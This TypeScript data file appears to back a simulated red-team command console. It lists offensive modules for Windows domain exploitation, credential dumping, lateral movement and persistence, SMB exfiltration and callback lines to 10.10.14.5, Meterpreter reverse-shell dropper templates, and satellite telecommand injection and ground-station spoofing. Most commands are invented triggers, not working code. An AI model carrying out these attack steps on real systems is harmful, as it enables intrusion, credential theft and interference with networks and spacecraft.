
import { OffensiveModule, DropperTemplate, PentestTool, APTChain, OrbitalAsset, RFProfile } from './types';

export const RF_REGISTRY: RFProfile[] = [
  { id: 'rf-noaa', name: 'NOAA-15 HRPT', frequency: '137.620 MHz', bandwidth: '34 kHz', modulation: 'QPSK', noiseFloor: -110, iqSignature: 'noaa_hrpt_iq' },
  { id: 'rf-iridium', name: 'Iridium-Next L-Band', frequency: '1.616 GHz', bandwidth: '1.25 MHz', modulation: 'DE-QPSK', noiseFloor: -125, iqSignature: 'iridium_burst_iq' },
  { id: 'rf-starlink', name: 'Starlink Ku-Down', frequency: '11.7 GHz', bandwidth: '250 MHz', modulation: '64QAM', noiseFloor: -95, iqSignature: 'sl_phased_array_iq' },
  { id: 'rf-gs-nasa', name: 'NASA Deep Space Mimic', frequency: '2.2 GHz', bandwidth: '10 MHz', modulation: 'BPSK', noiseFloor: -115, iqSignature: 'nasa_uplink_sig', isGroundStationMimic: true },
  { id: 'rf-gs-esa', name: 'ESA Estrack Mimic', frequency: '8.4 GHz', bandwidth: '5 MHz', modulation: 'PCM/PSK/PM', noiseFloor: -140, iqSignature: 'esa_ka_band_sig', isGroundStationMimic: true }
];

export const ORBITAL_ASSETS: OrbitalAsset[] = [
  {
    id: 'sat-leo-01',
    designation: 'STERN-WATCH-4',
    noradId: 43105,
    type: 'LEO',
    inclination: 97.4,
    altitude: 540,
    snr: 42,
    status: 'tracking',
    currentOperator: 'Spectre-Lead',
    protocols: ['CCSDS', 'SpaceWire', 'X-Band'],
    coords: { lat: 37.7749, lng: -122.4194, alt: 540.2, velocity: 7.6 },
    tle: {
      line1: '1 43105U 18004A   24020.12345678  .00000123  00000-0  12345-4 0  9991',
      line2: '2 43105  97.4123 123.4567 0001234 123.4567 123.4567 15.12345678 12345',
      epoch: '2024-01-20T12:00:00Z'
    },
    subsystems: [
      { id: 'eps', name: 'EPS (Power)', status: 'nominal', load: 45, telemetry: { v_bus: '28.2V', i_draw: '1.4A', batt_temp: '22C', discharge_rate: '0.2%/min' } },
      { id: 'aocs', name: 'AOCS (Attitude)', status: 'nominal', load: 12, telemetry: { roll: '0.12', pitch: '-0.04', yaw: '0.01', momentum_wheel: '2400RPM' } },
      { id: 'comms', name: 'COMMS Relay', status: 'degraded', load: 88, telemetry: { bit_error_rate: '1.2e-5', buffer_fill: '92%', x_band_power: '42dBm' } },
      { id: 'thermal', name: 'Thermal Mgmt', status: 'nominal', load: 22, telemetry: { radiator_temp: '-12C', cpu_temp: '34C' } }
    ],
    rfProfile: RF_REGISTRY[0]
  },
  {
    id: 'sat-leo-iridium',
    designation: 'Iridium-Next-142',
    noradId: 43569,
    type: 'LEO',
    inclination: 86.4,
    altitude: 780,
    snr: 65,
    status: 'auto-tracking',
    protocols: ['L-Band', 'ISL', 'CCSDS'],
    coords: { lat: 51.5074, lng: -0.1278, alt: 781.4, velocity: 7.4 },
    tle: {
      line1: '1 43569U 18059A   24020.12345678  .00000123  00000-0  12345-4 0  9991',
      line2: '2 43569  86.4123 123.4567 0001234 123.4567 123.4567 14.12345678 12345',
      epoch: '2024-01-20T12:00:00Z'
    },
    subsystems: [
      { id: 'eps', name: 'EPS (Power)', status: 'nominal', load: 30, telemetry: { v_bus: '32V', i_draw: '0.8A' } },
      { id: 'payload', name: 'Cross-Link Ant', status: 'nominal', load: 5, telemetry: { peer_sat: 'Iridium-141', link_quality: '98%' } }
    ],
    rfProfile: RF_REGISTRY[1]
  }
];

export const APT_ATTACK_CHAINS: APTChain[] = [
  {
    id: 'chain-shadow-mesh',
    name: 'Distributed Signal Proxy Mesh',
    description: 'Establishes a resilient P2P SMB mesh to channel exfiltration through low-noise egress nodes.',
    threatActorMimicry: 'Multi-Protocol Evasion Pattern',
    status: 'Idle',
    heatLevel: 15,
    steps: [
      { id: 's1', name: 'Environment Fingerprinting', command: 'check-env --detailed', delay: 2000, opsecRisk: 'Low', requiredIntegrity: 'User' },
      { id: 's2', name: 'Inter-Node Linkage', command: 'mesh-connect --peer DC01 --protocol smb_named_pipe', delay: 5000, opsecRisk: 'Medium', requiredIntegrity: 'User' },
      { id: 's3', name: 'Authorized Credential Retrieval', command: 'get-creds --method memory-scan', delay: 10000, opsecRisk: 'High', requiredIntegrity: 'Administrator' }
    ]
  }
];

export const OFFENSIVE_REGISTRY: OffensiveModule[] = [
  // ==================== RECON MODULES ====================
  {
    id: 'enum-domain',
    name: 'Domain Enumeration',
    category: 'Recon',
    description: 'Enumerate Active Directory domain information (users, admins, trusts, groups).',
    opsecRisk: 'Low',
    noiseLevel: 2,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'enum-domain --full', description: 'Full domain enumeration' },
      { trigger: 'enum-domain --users', description: 'Enumerate domain users' },
      { trigger: 'enum-domain --admins', description: 'List domain admins' },
      { trigger: 'enum-domain --trusts', description: 'Enumerate domain trusts' }
    ]
  },
  {
    id: 'scan-network',
    name: 'Network Discovery',
    category: 'Recon',
    description: 'Discover live hosts on target network subnet.',
    opsecRisk: 'Medium',
    noiseLevel: 6,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'scan-network --subnet 192.168.1.0/24', description: 'Scan network subnet' }
    ]
  },
  {
    id: 'scan-ports',
    name: 'Port Scanner',
    category: 'Recon',
    description: 'Scan target host for open TCP/UDP ports.',
    opsecRisk: 'Medium',
    noiseLevel: 7,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'scan-ports --target 192.168.1.10', description: 'Scan target ports' }
    ]
  },
  {
    id: 'scan-services',
    name: 'Service Enumeration',
    category: 'Recon',
    description: 'Identify services and versions running on target host.',
    opsecRisk: 'Medium',
    noiseLevel: 5,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'scan-services --target 192.168.1.10', description: 'Enumerate services' }
    ]
  },
  {
    id: 'bloodhound',
    name: 'BloodHound Collection',
    category: 'Recon',
    description: 'Collect Active Directory data for graph analysis and attack path discovery.',
    opsecRisk: 'High',
    noiseLevel: 8,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'bloodhound --collect all', description: 'Collect all AD data' }
    ]
  },
  {
    id: 'enum-processes',
    name: 'Process Enumeration',
    category: 'Recon',
    description: 'List running processes and associated security context.',
    opsecRisk: 'Low',
    noiseLevel: 1,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'enum-processes', description: 'List all processes' }
    ]
  },
  {
    id: 'enum-modules',
    name: 'Module Enumeration',
    category: 'Recon',
    description: 'List loaded DLLs and modules for target process.',
    opsecRisk: 'Low',
    noiseLevel: 1,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'enum-modules --pid 1234', description: 'Enumerate process modules' }
    ]
  },
  {
    id: 'scan-orbital',
    name: 'Orbital Asset Scanner',
    category: 'Recon',
    description: 'Scan for accessible satellite command interfaces and open RF channels.',
    opsecRisk: 'Low',
    noiseLevel: 3,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'scan-orbital --freq-range 137-138', description: 'Scan orbital frequencies' }
    ]
  },
  
  // ==================== EXPLOITATION MODULES ====================
  {
    id: 'exploit-eternalblue',
    name: 'EternalBlue (MS17-010)',
    category: 'Exploitation',
    description: 'Exploit SMBv1 vulnerability for remote code execution.',
    opsecRisk: 'High',
    noiseLevel: 10,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'exploit-eternalblue --target 192.168.1.10', description: 'Execute EternalBlue exploit' }
    ]
  },
  {
    id: 'exploit-zerologon',
    name: 'Zerologon (CVE-2020-1472)',
    category: 'Exploitation',
    description: 'Exploit Netlogon protocol to compromise domain controller.',
    opsecRisk: 'High',
    noiseLevel: 9,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'exploit-zerologon --dc DC01', description: 'Execute Zerologon exploit' }
    ]
  },
  {
    id: 'exploit-printnightmare',
    name: 'PrintNightmare (CVE-2021-1675)',
    category: 'Exploitation',
    description: 'Exploit Windows Print Spooler for privilege escalation or RCE.',
    opsecRisk: 'High',
    noiseLevel: 8,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'exploit-printnightmare --target localhost', description: 'Execute PrintNightmare' }
    ]
  },
  {
    id: 'ccsds-inject',
    name: 'CCSDS Packet Injection',
    category: 'Exploitation',
    description: 'Inject CCSDS space packets to manipulate satellite telecommand interfaces.',
    opsecRisk: 'High',
    noiseLevel: 9,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'ccsds-inject --apid 0x3E5', description: 'Inject telecommand packet' }
    ]
  },
  {
    id: 'ccsds-tm-spoof',
    name: 'CCSDS Telemetry Spoof',
    category: 'Exploitation',
    description: 'Inject spoofed telemetry packets to mask satellite status.',
    opsecRisk: 'High',
    noiseLevel: 8,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'ccsds-tm-spoof --sat ISS', description: 'Spoof telemetry data' }
    ]
  },
  {
    id: 'kerberoast',
    name: 'Kerberoasting',
    category: 'Exploitation',
    description: 'Extract and crack Kerberos TGS service tickets for domain accounts.',
    opsecRisk: 'Medium',
    noiseLevel: 5,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'kerberoast --domain CORP', description: 'Perform Kerberoasting attack' }
    ]
  },
  
  // ==================== POST-EXPLOITATION MODULES ====================
  {
    id: 'harvest-creds',
    name: 'Credential Harvesting',
    category: 'Post-Ex',
    description: 'Extract credentials from LSASS memory, SAM registry, or DC sync.',
    opsecRisk: 'High',
    noiseLevel: 9,
    requiredIntegrity: 'Administrator',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'harvest-creds --lsass', description: 'Dump LSASS memory' },
      { trigger: 'harvest-creds --sam', description: 'Dump SAM hashes' },
      { trigger: 'harvest-creds --dcsync', description: 'DC Sync attack' }
    ]
  },
  {
    id: 'lateral-psexec',
    name: 'Lateral Movement (PsExec)',
    category: 'Post-Ex',
    description: 'Execute commands on remote system using PsExec technique.',
    opsecRisk: 'High',
    noiseLevel: 8,
    requiredIntegrity: 'Administrator',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'lateral-psexec --target DC01 --command whoami', description: 'PsExec lateral movement' }
    ]
  },
  {
    id: 'lateral-wmi',
    name: 'Lateral Movement (WMI)',
    category: 'Post-Ex',
    description: 'Execute commands on remote system using WMI.',
    opsecRisk: 'Medium',
    noiseLevel: 6,
    requiredIntegrity: 'Administrator',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'lateral-wmi --target DC01 --command hostname', description: 'WMI lateral movement' }
    ]
  },
  {
    id: 'steal-token',
    name: 'Token Theft',
    category: 'Post-Ex',
    description: 'Steal access token from target process for impersonation.',
    opsecRisk: 'Medium',
    noiseLevel: 4,
    requiredIntegrity: 'Administrator',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'steal-token --pid 1234', description: 'Steal process token' }
    ]
  },
  {
    id: 'revert-token',
    name: 'Token Reversion',
    category: 'Post-Ex',
    description: 'Revert to original process token.',
    opsecRisk: 'Low',
    noiseLevel: 1,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'revert-token', description: 'Revert to original token' }
    ]
  },
  {
    id: 'exfil-smb',
    name: 'SMB Data Exfiltration',
    category: 'Post-Ex',
    description: 'Exfiltrate files/data over SMB to remote server.',
    opsecRisk: 'High',
    noiseLevel: 7,
    requiredIntegrity: 'Administrator',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'exfil-smb --path C:\\Users --target 10.10.14.5', description: 'Exfiltrate via SMB' }
    ]
  },
  {
    id: 'relay-init',
    name: 'Orbital Relay Initialization',
    category: 'Post-Ex',
    description: 'Initialize multi-hop orbital relay chain to obfuscate C2 traffic.',
    opsecRisk: 'Low',
    noiseLevel: 2,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'relay-init --chain [43105,43569]', description: 'Init orbital relay' }
    ]
  },
  {
    id: 'relay-status',
    name: 'Relay Status Check',
    category: 'Post-Ex',
    description: 'Check current status of orbital relay chain.',
    opsecRisk: 'Low',
    noiseLevel: 1,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'relay-status', description: 'Check relay status' }
    ]
  },
  
  // ==================== PERSISTENCE MODULES ====================
  {
    id: 'persist-schtask',
    name: 'Scheduled Task Persistence',
    category: 'Persistence',
    description: 'Create scheduled task for persistent access.',
    opsecRisk: 'Medium',
    noiseLevel: 5,
    requiredIntegrity: 'Administrator',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'persist-schtask --name WindowsUpdate --exe C:\\beacon.exe', description: 'Create scheduled task' }
    ]
  },
  {
    id: 'persist-registry',
    name: 'Registry Run Key Persistence',
    category: 'Persistence',
    description: 'Add registry Run key for auto-start persistence.',
    opsecRisk: 'Medium',
    noiseLevel: 4,
    requiredIntegrity: 'Administrator',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'persist-registry --name SecurityHealth --exe C:\\beacon.exe', description: 'Add registry key' }
    ]
  },
  {
    id: 'persist-service',
    name: 'Windows Service Persistence',
    category: 'Persistence',
    description: 'Install Windows service for persistent access.',
    opsecRisk: 'High',
    noiseLevel: 7,
    requiredIntegrity: 'Administrator',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'persist-service --name SecurityHealthService --exe C:\\beacon.exe', description: 'Install service' }
    ]
  },
  {
    id: 'persist-wmi',
    name: 'WMI Event Subscription',
    category: 'Persistence',
    description: 'Create WMI event subscription for fileless persistence.',
    opsecRisk: 'Low',
    noiseLevel: 3,
    requiredIntegrity: 'Administrator',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'persist-wmi --trigger logon --payload base64payload', description: 'Create WMI subscription' }
    ]
  },
  {
    id: 'golden-ticket',
    name: 'Golden Ticket Persistence',
    category: 'Persistence',
    description: 'Generate Kerberos Golden Ticket for domain-wide persistence.',
    opsecRisk: 'High',
    noiseLevel: 8,
    requiredIntegrity: 'SYSTEM',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'golden-ticket --user Administrator --domain CORP.LOCAL', description: 'Generate Golden Ticket' }
    ]
  },
  {
    id: 'persist-aos',
    name: 'Satellite AOS Persistence',
    category: 'Persistence',
    description: 'Maintain persistence via satellite Acquisition of Signal (AOS) triggers.',
    opsecRisk: 'Low',
    noiseLevel: 2,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'persist-aos --sat ISS --callback http://10.10.14.5', description: 'Configure AOS trigger' }
    ]
  },
  {
    id: 'gs-mimic',
    name: 'Ground Station Mimicry',
    category: 'Persistence',
    description: 'Mimic authorized ground station RF signature for persistent satellite access.',
    opsecRisk: 'Low',
    noiseLevel: 1,
    requiredIntegrity: 'User',
    author: 'Spectre-Team',
    commands: [
      { trigger: 'gs-mimic --profile NASA_CANBERRA', description: 'Enable GS mimicry' }
    ]
  }
];

export const DROPPER_TEMPLATES: DropperTemplate[] = [
  {
    id: 'powershell_reverse_tcp',
    name: 'PowerShell Reverse TCP',
    format: 'powershell',
    template: 'windows/x64/meterpreter/reverse_tcp',
    description: 'Staged PowerShell reverse TCP connection',
    evasionLevel: 'Moderate',
    targetOS: 'Windows'
  },
  {
    id: 'shellcode_x64',
    name: 'Raw Shellcode x64',
    format: 'c',
    template: 'windows/x64/meterpreter/reverse_https',
    description: 'Position-independent shellcode for injection',
    evasionLevel: 'High',
    targetOS: 'Windows'
  },
  {
    id: 'dll_injection',
    name: 'DLL Reflective Loader',
    format: 'dll',
    template: 'windows/x64/meterpreter/reverse_tcp',
    description: 'Reflective DLL injection payload',
    evasionLevel: 'Moderate',
    targetOS: 'Windows'
  },
  {
    id: 'exe_stageless',
    name: 'Stageless EXE',
    format: 'exe',
    template: 'windows/x64/meterpreter_reverse_tcp',
    description: 'Standalone executable with embedded payload',
    evasionLevel: 'Low',
    targetOS: 'Windows'
  },
  {
    id: 'python_stager',
    name: 'Python Stager',
    format: 'python',
    template: 'python/meterpreter/reverse_tcp',
    description: 'Python-based multi-platform stager',
    evasionLevel: 'Moderate',
    targetOS: 'Multi-Platform'
  }
];

export const PENTEST_TOOLS: PentestTool[] = [
  {
    id: 'ccsds-fuzzer',
    name: 'CCSDS Protocol Fuzzer',
    category: 'SIGINT',
    description: 'Automated bit-flipping and sequence entropy testing for space-data protocols.',
    rawUrl: 'internal://ccsds-fuzz',
    githubUrl: 'https://github.com/spectre/ccsds-fuzz',
    type: 'exe'
  }
];

export const DEFAULT_SNIPPETS = [
  {
    id: 'snip-1',
    title: 'Privilege Check',
    description: 'Check current user privileges and integrity level.',
    code: 'whoami /priv',
    category: 'Recon'
  },
  {
    id: 'snip-2',
    title: 'Domain Admins',
    description: 'List all members of the Domain Admins group.',
    code: 'net group "Domain Admins" /domain',
    category: 'Recon'
  }
];
